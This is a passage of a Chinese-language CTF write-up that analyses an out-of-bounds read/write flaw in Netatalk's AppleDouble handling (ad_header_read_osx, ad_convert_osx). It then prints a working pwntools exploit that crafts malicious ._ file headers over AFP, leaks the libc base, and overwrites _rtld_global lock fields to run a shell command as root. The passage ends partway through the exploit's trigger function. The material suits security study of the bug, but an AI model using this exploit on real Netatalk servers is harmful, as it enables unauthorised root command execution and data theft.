class="line">......</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Read an ._ file, only uses the resofork, finderinfo is taken from EA */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ad_header_read_osx</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="keyword">struct</span> adouble *ad, <span class="type">const</span> <span class="keyword">struct</span> stat *hst)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line">    nentries = len / AD_ENTRY_LEN;</span><br><span class="line">    <span class="keyword">if</span> (parse_entries(&amp;adosx, buf, nentries) != <span class="number">0</span>) {</span><br><span class="line">        LOG(log_warning, logtype_ad, <span class="string">"ad_header_read(%s): malformed AppleDouble"</span>,</span><br><span class="line">            path ? fullpathname(path) : <span class="string">""</span>);</span><br><span class="line">    }</span><br><span class="line">......</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EC_FAIL do { ret = -1; goto cleanup; } while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ad_header_read_ea</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="keyword">struct</span> adouble *ad, <span class="type">const</span> <span class="keyword">struct</span> stat *hst _U_)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line">    <span class="comment">/* Now parse entries */</span></span><br><span class="line">    <span class="keyword">if</span> (parse_entries(ad, buf + AD_HEADER_LEN, nentries)) {</span><br><span class="line">        LOG(log_warning, logtype_ad, <span class="string">"ad_header_read(%s): malformed AppleDouble"</span>,</span><br><span class="line">            path ? fullpathname(path) : <span class="string">""</span>);</span><br><span class="line">        errno = EINVAL;</span><br><span class="line">        EC_FAIL;</span><br><span class="line">    }</span><br><span class="line">......</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>可以发现在ad_header_read_osx中的错误处理并不会立刻返回,而是继续处理.这才是真正存在漏洞的函数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Read an ._ file, only uses the resofork, finderinfo is taken from EA */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ad_header_read_osx</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="keyword">struct</span> adouble *ad, <span class="type">const</span> <span class="keyword">struct</span> stat *hst)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line">    nentries = len / AD_ENTRY_LEN;</span><br><span class="line">    <span class="keyword">if</span> (parse_entries(&amp;adosx, buf, nentries) != <span class="number">0</span>) {</span><br><span class="line">        LOG(log_warning, logtype_ad, <span class="string">"ad_header_read(%s): malformed AppleDouble"</span>,</span><br><span class="line">            path ? fullpathname(path) : <span class="string">""</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ad_getentrylen(&amp;adosx, ADEID_FINDERI) != ADEDLEN_FINDERI) {</span><br><span class="line">        LOG(log_warning, logtype_ad, <span class="string">"Convert OS X to Netatalk AppleDouble: %s"</span>,</span><br><span class="line">            path ? fullpathname(path) : <span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (retry_read &gt; <span class="number">0</span>) {</span><br><span class="line">            LOG(log_error, logtype_ad, <span class="string">"ad_header_read_osx: %s, giving up"</span>, path ? fullpathname(path) : <span class="string">""</span>);</span><br><span class="line">            errno = EIO;</span><br><span class="line">            EC_FAIL;</span><br><span class="line">        }</span><br><span class="line">        retry_read++;</span><br><span class="line">        <span class="keyword">if</span> (ad_convert_osx(path, &amp;adosx) == <span class="number">1</span>) {</span><br><span class="line">            <span class="keyword">goto</span> reread;</span><br><span class="line">        }</span><br><span class="line">        errno = EIO;</span><br><span class="line">        EC_FAIL;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ad_getentryoff(&amp;adosx, ADEID_RFORK) == <span class="number">0</span></span><br><span class="line">        || ad_getentryoff(&amp;adosx, ADEID_RFORK) &gt; <span class="keyword">sizeof</span>(ad-&gt;ad_data)</span><br><span class="line">        || ad_getentryoff(&amp;adosx, ADEID_RFORK) &gt; header_len</span><br><span class="line">        ) {</span><br><span class="line">        LOG(log_error, logtype_ad, <span class="string">"ad_header_read_osx: problem with rfork entry offset."</span>);</span><br><span class="line">        errno = EIO;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hst == <span class="literal">NULL</span>) {</span><br><span class="line">        hst = &amp;st;</span><br><span class="line">        EC_NEG1( fstat(ad_reso_fileno(ad), &amp;st) );</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    ad_setentryoff(ad, ADEID_RFORK, ad_getentryoff(&amp;adosx, ADEID_RFORK));</span><br><span class="line">    ad-&gt;ad_rlen = hst-&gt;st_size - ad_getentryoff(ad, ADEID_RFORK);</span><br><span class="line"></span><br><span class="line">EC_CLEANUP:</span><br><span class="line">    EC_EXIT;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>最终会在ad_convert_osx中使用非法的off字段.该函数截断AppleDouble中的FinderInfo条目到32字节.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Convert from Apple's ._ file to Netatalk</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Apple's AppleDouble may contain a FinderInfo entry longer then 32 bytes</span></span><br><span class="line"><span class="comment"> * containing packed xattrs. Netatalk can't deal with that, so we</span></span><br><span class="line"><span class="comment"> * simply discard the packed xattrs.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * As we call ad_open() which might result in a recursion, just to be sure</span></span><br><span class="line"><span class="comment"> * use static variable in_conversion to check for that.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns -1 in case an error occured, 0 if no conversion was done, 1 otherwise</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ad_convert_osx</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="keyword">struct</span> adouble *ad)</span></span><br><span class="line">{</span><br><span class="line">    EC_INIT;</span><br><span class="line">    <span class="type">static</span> <span class="type">bool</span> in_conversion = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">char</span> *<span class="built_in">map</span>;</span><br><span class="line">    <span class="type">int</span> finderlen = ad_getentrylen(ad, ADEID_FINDERI);</span><br><span class="line">    <span class="type">ssize_t</span> origlen;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_conversion || finderlen == ADEDLEN_FINDERI)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    in_conversion = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    LOG(log_debug, logtype_ad, <span class="string">"Converting OS X AppleDouble %s, FinderInfo length: %d"</span>,</span><br><span class="line">        fullpathname(path), finderlen);</span><br><span class="line"></span><br><span class="line">    origlen = ad_getentryoff(ad, ADEID_RFORK) + ad_getentrylen(ad, ADEID_RFORK);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, origlen, PROT_READ | PROT_WRITE, MAP_SHARED, ad_reso_fileno(ad), <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">map</span> == MAP_FAILED) {</span><br><span class="line">        LOG(log_error, logtype_ad, <span class="string">"mmap AppleDouble: %s\n"</span>, strerror(errno));</span><br><span class="line">        EC_FAIL;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    memmove(<span class="built_in">map</span> + ad_getentryoff(ad, ADEID_FINDERI) + ADEDLEN_FINDERI,</span><br><span class="line">            <span class="built_in">map</span> + ad_getentryoff(ad, ADEID_RFORK),</span><br><span class="line">            ad_getentrylen(ad, ADEID_RFORK));</span><br><span class="line"></span><br><span class="line">    ad_setentrylen(ad, ADEID_FINDERI, ADEDLEN_FINDERI);</span><br><span class="line">    ad-&gt;ad_rlen = ad_getentrylen(ad, ADEID_RFORK);</span><br><span class="line">    ad_setentryoff(ad, ADEID_RFORK, ad_getentryoff(ad, ADEID_FINDERI) + ADEDLEN_FINDERI);</span><br><span class="line"></span><br><span class="line">    EC_ZERO_LOG( ftruncate(ad_reso_fileno(ad),</span><br><span class="line">                           ad_getentryoff(ad, ADEID_RFORK)</span><br><span class="line">                           + ad_getentrylen(ad, ADEID_RFORK)) );</span><br><span class="line"></span><br><span class="line">    (<span class="type">void</span>)ad_rebuild_adouble_header_osx(ad, <span class="built_in">map</span>);</span><br><span class="line">    munmap(<span class="built_in">map</span>, origlen);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create a metadata EA if one doesn't exit */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(path) &lt; <span class="number">3</span>)</span><br><span class="line">        EC_EXIT_STATUS(<span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">adouble</span> <span class="title">adea</span>;</span></span><br><span class="line">    ad_init_old(&amp;adea, AD_VERSION_EA, ad-&gt;ad_options);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ad_open(&amp;adea, path + <span class="number">2</span>, ADFLAGS_HF | ADFLAGS_RDWR | ADFLAGS_CREATE, <span class="number">0666</span>) &lt; <span class="number">0</span>) {</span><br><span class="line">        LOG(log_error, logtype_ad, <span class="string">"create metadata: %s\n"</span>, strerror(errno));</span><br><span class="line">        EC_FAIL;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (adea.ad_mdp-&gt;adf_flags &amp; O_CREAT) {</span><br><span class="line">        <span class="built_in">memcpy</span>(ad_entry(&amp;adea, ADEID_FINDERI),</span><br><span class="line">               ad_entry(ad, ADEID_FINDERI),</span><br><span class="line">               ADEDLEN_FINDERI);</span><br><span class="line">        ad_flush(&amp;adea);</span><br><span class="line">    }</span><br><span class="line">    ad_close(&amp;adea, ADFLAGS_HF);</span><br><span class="line"></span><br><span class="line">EC_CLEANUP:</span><br><span class="line">    in_conversion = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (ret != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>注意到这一句关键代码,以可控偏移和可控长度将可控内容向map写入.而map是通过mmap分配得到到与libc,ld之间的偏移固定,于是该原语可以完成libc和ld中的任意写入.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">memmove(<span class="built_in">map</span> + ad_getentryoff(ad, ADEID_FINDERI) + ADEDLEN_FINDERI,</span><br><span class="line">        <span class="built_in">map</span> + ad_getentryoff(ad, ADEID_RFORK),</span><br><span class="line">        ad_getentrylen(ad, ADEID_RFORK));</span><br></pre></td></tr></tbody></table></figure><p>虽然说该原语也能完成libc地址的泄露,不过更好的(<del>其实差不多</del>)越界读原语在ad_rebuild_adouble_header_osx中.<br>如下所示,这里的ad是一个栈上的局部变量,对它进行任意偏移读取32字节到adbuf中(即写入文件),再从文件中读取即可获取到栈上保存的__libc_start_main的地址.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ad_rebuild_adouble_header_osx</span><span class="params">(<span class="keyword">struct</span> adouble *ad, <span class="type">char</span> *adbuf)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line">    <span class="built_in">memcpy</span>(adbuf + ADEDOFF_FINDERI_OSX, ad_entry(ad, ADEID_FINDERI), ADEDLEN_FINDERI);</span><br><span class="line">......</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403241957827.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403250000707.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403242016093.png"></p><p>在glibc2.27版本中,直接写入_rtld_global._dl_rtld_lock_recursive以及_rtld_global._dl_load_lock即可布置一次命令执行.(ps:写入时偏移过大会在ad_rebuild_adouble_header_osx中的memcpy崩溃,好在Netatalk有注册SIGSEGV的信号处理函数并最终abort,能成功触发”exit_hook”)</p><p>梳理一下利用的调用链:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ad_open</span><br><span class="line"> -&gt;adopen_rf</span><br><span class="line">  -&gt;ad_open_rf_ea</span><br><span class="line">   -&gt;ad_header_read_osx</span><br><span class="line">    -&gt;parse_entries</span><br><span class="line">    -&gt;ad_convert_osx</span><br><span class="line">     -&gt;ad_rebuild_adouble_header_osx</span><br></pre></td></tr></tbody></table></figure><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p>由于笔者没有公网IP没法弹shell,利用服务的root权限将flag读出来后重新写入Shared卷中,再次建立连接正常读文件即可.</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">from</span> mimetypes <span class="keyword">import</span> encodings_map</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>, endian=<span class="string">'little'</span>)</span><br><span class="line">context.log_level = <span class="string">'info'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> afputils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">dl_load_lock_off =  <span class="number">0x4524</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Helper function to create AppleDouble metadata header</span></span><br><span class="line"><span class="comment"># you can modify the header as you want...</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createAppleDoubleForLeak</span>():</span><br><span class="line">  header = p32(<span class="number">0x51607</span>)                     <span class="comment">#Magic number double</span></span><br><span class="line">  header += p32(<span class="number">0x20000</span>)                    <span class="comment">#Version number</span></span><br><span class="line">  header += p8(<span class="number">0</span>) * <span class="number">16</span>                      <span class="comment">#Filler</span></span><br><span class="line">  header += p16(<span class="number">2</span>)                          <span class="comment">#Number of entries</span></span><br><span class="line">  header += p32(<span class="number">9</span>)                          <span class="comment">#Entry Id Finder Info</span></span><br><span class="line">  header += pack(<span class="number">0x7fa</span>,<span class="number">32</span>,<span class="string">'big'</span>, <span class="literal">True</span>)          <span class="comment"># offset</span></span><br><span class="line">  header += p32(<span class="number">30</span>)                         <span class="comment"># Set length other than 32 to call 'ad_convert_osx'</span></span><br><span class="line">  header += p32(<span class="number">2</span>)                          <span class="comment"># Entry Id Resource Fork</span></span><br><span class="line">  header += p32(<span class="number">0x100</span>)                      <span class="comment"># #Control the mmap size</span></span><br><span class="line">  header += p32(<span class="number">0</span>)                          <span class="comment"># length</span></span><br><span class="line">  <span class="comment">############</span></span><br><span class="line">  <span class="comment"># usefull to find adouble offset</span></span><br><span class="line">  <span class="comment">###########</span></span><br><span class="line">  header += <span class="string">b'JUNK'</span> * <span class="number">8</span></span><br><span class="line">  <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line"><span class="comment"># Helper function to create AppleDouble metadata header</span></span><br><span class="line"><span class="comment"># you can modify the header as you want...</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createAppleDoubleForArbWrite</span>():</span><br><span class="line">  header = p32(<span class="number">0x51607</span>)                     <span class="comment">#Magic number double</span></span><br><span class="line">  header += p32(<span class="number">0x20000</span>)                    <span class="comment">#Version number</span></span><br><span class="line">  header += p8(<span class="number">0</span>) * <span class="number">16</span>                      <span class="comment">#Filler</span></span><br><span class="line">  header += p16(<span class="number">2</span>)                          <span class="comment">#Number of entries</span></span><br><span class="line">  header += p32(<span class="number">9</span>)                          <span class="comment">#Entry Id Finder Info</span></span><br><span class="line">  header += pack(dl_load_lock_off-<span class="number">32</span>,<span class="number">32</span>,<span class="string">'big'</span>, <span class="literal">True</span>)          <span class="comment"># offset</span></span><br><span class="line">  header += p32(<span class="number">30</span>)                         <span class="comment"># Set length other than 32 to call 'ad_convert_osx'</span></span><br><span class="line">  header += p32(<span class="number">2</span>)                          <span class="comment"># Entry Id Resource Fork</span></span><br><span class="line">  header += p32(<span class="number">0x100</span>)                      <span class="comment"># #Control the mmap size</span></span><br><span class="line">  header += p32(<span class="number">0x330</span>)                          <span class="comment"># length</span></span><br><span class="line"></span><br><span class="line">  header = header.ljust(<span class="number">0x100</span>,<span class="string">b'a'</span>)</span><br><span class="line">  cmd = <span class="string">b'cat /flag* &gt; /home/xxxx/shared/flag\x00'</span></span><br><span class="line">  header += cmd</span><br><span class="line">  header += <span class="string">b'b'</span>*(<span class="number">0x32C</span>-<span class="built_in">len</span>(cmd))</span><br><span class="line">  header += pack(system_addr+<span class="number">1</span>,<span class="number">32</span>,<span class="string">'little'</span>, <span class="literal">False</span>) </span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line"><span class="comment"># ip and port of the local netatalk server</span></span><br><span class="line">ip = <span class="string">"127.0.0.1"</span></span><br><span class="line">port = <span class="number">5548</span></span><br><span class="line">volume = <span class="string">"Shared"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ip = "pwn3.aliyunctf.com"</span></span><br><span class="line"><span class="comment"># port = 32514</span></span><br><span class="line"><span class="comment"># volume = "Shared"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立连接并创建卷</span></span><br><span class="line">p = connect(ip, port)</span><br><span class="line">response, request_id = DSIOpenSession(p, debug)</span><br><span class="line">response, request_id = FPLogin(p, request_id, <span class="string">b'AFP3.3'</span>, <span class="string">b'No User Authent'</span>, <span class="literal">None</span>, debug)</span><br><span class="line">response, request_id, volume_id = FPOpenVol(p, request_id, <span class="number">0x21</span>, <span class="built_in">bytes</span>(volume,encoding=<span class="string">'utf-8'</span>), <span class="literal">None</span>, debug)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建恶意文件</span></span><br><span class="line">response, request_id = FPCreateFile(p, request_id, volume_id, <span class="number">2</span>, <span class="number">2</span>, <span class="string">b"leak_file"</span>, debug)</span><br><span class="line">response, request_id, fork1 = FPOpenFork(p, request_id, <span class="number">0</span>, volume_id, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="string">b"leak_file"</span>, debug)</span><br><span class="line"></span><br><span class="line">data = <span class="string">b'Hello World !'</span></span><br><span class="line"></span><br><span class="line">response, request_id = FPWriteExt(p, request_id, fork1, <span class="number">0</span>, <span class="built_in">len</span>(data), data, debug)</span><br><span class="line">response, request_id = FPCloseFork(p, request_id, fork1, debug)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建恶意文件的AppleDouble metadata,越界读出栈上的libc地址到恶意文件中</span></span><br><span class="line">appledouble = createAppleDoubleForLeak()</span><br><span class="line">response, request_id = FPCreateFile(p, request_id, volume_id, <span class="number">2</span>, <span class="number">2</span>, <span class="string">b"._leak_file"</span>, debug)</span><br><span class="line">response, request_id, fork2 = FPOpenFork(p, request_id, <span class="number">0</span>, volume_id, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="string">b"._leak_file"</span>, debug)</span><br><span class="line">response, request_id = FPWriteExt(p, request_id, fork2, <span class="number">0</span>, <span class="built_in">len</span>(appledouble), appledouble, debug)    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取恶意文件中获取到的libc地址</span></span><br><span class="line">response, request_id, fork3 = FPOpenFork(p, request_id, <span class="number">1</span>, volume_id, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="string">b"leak_file"</span>, debug)</span><br><span class="line">response, request_id = FPReadExt(p,request_id,fork2,<span class="number">50</span>,<span class="number">4</span>,debug)</span><br><span class="line"></span><br><span class="line">libc_base = unpack(response[<span class="number">16</span>:<span class="number">20</span>],<span class="number">32</span>,endian=<span class="string">'little'</span>)-<span class="number">0x170e7</span></span><br><span class="line">system_addr = libc_base+<span class="number">0x2d4dc</span></span><br><span class="line">binsh_addr = libc_base+<span class="number">0xd5af8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"libc_base-&gt;"</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">response, request_id = FPCloseFork(p, request_id, fork3, debug)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Trigger</span>(<span class="params">server, request_id, flag, volume_id, directory_id, bitmap, access_mode, path_type, path_name, info=<span class="literal">False</span></span>):</span><br><span class="line"></span><br><span class="line">    afp_command = p8(<span class="number">26</span>, endian=<span class="string">'big'</span>)                  <span class="comment"># command code : 26 --&gt; kFPOpenFork</span></span><br><span class="line">    afp_command += p8(flag, endian=<span class="string">'big'</span>)               <span class="comment"># flag</span></span><br><span class="line">    afp_command += p16(volume_id, endian=<span class="string">'big'</span>)         <span class="comment"># volume id</span></span><br><span class="line">    afp_command += p32(directory_id, endian=<span class="string">'big'</span>)      <span class="comment"># directory id </span></span><br><span class="line">    afp_command += p16(bitmap, endian=<span class="string">'big'</span>)            <span class="comment"># bitmap</span></span><br><span class="line">    afp_command += p16(access_mode, endian=<span class="string">'big'</span>)         <span class="comment"># access_mode </span></span><br><span class="line">    afp_command += p8(path_type, endian=<span class="string">'big'</span>)         <span class="comment"># path type</span></span><br><span class="line">    afp_command += p8(<span class="built_in">len</span>(path_name), endian=<span class="string">'big'</span>)     <span class="comment"># len path name</span></span><br><span class="line">    afp_command += path_name</span><br><span class="line"></span><br><span class="line">    dsi_header = DSIHeader(<span class="number">0</span>, <span class="number">2</span>, request_id, <span class="number">0</span>, <span class="built_in">len</span>(afp_command))</span><br><span class="line">    to_send = dsi_header + afp_command</span><br><span class="line">    